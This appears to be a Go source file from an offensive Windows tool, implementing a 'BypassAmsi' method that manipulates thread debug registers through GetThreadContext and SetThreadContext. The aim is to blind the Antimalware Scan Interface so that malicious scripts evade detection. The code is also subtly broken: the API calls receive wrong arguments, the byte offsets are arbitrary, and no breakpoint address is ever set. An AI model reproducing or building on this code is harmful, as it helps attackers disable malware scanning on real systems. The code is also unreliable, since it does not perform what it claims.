//go:build windows

package amsi_etw

import (
"golang.org/x/sys/windows"
"unsafe"
)

type HardwareBreakpoint struct{}

func NewHardwareBreakpoint() *HardwareBreakpoint {
return &HardwareBreakpoint{}
}

func (h *HardwareBreakpoint) BypassAmsi() error {
kernel32 := windows.NewLazyDLL("kernel32.dll")
procSetThreadContext := kernel32.NewProc("SetThreadContext")
procGetThreadContext := kernel32.NewProc("GetThreadContext")

var ctx [1024]byte
procGetThreadContext.Call(uintptr(unsafe.Pointer(&ctx)), 0x10007)

ctx[8] = 0x01
ctx[4*7] = 0x1

procSetThreadContext.Call(uintptr(unsafe.Pointer(&ctx)), 0x10007)
return nil
}
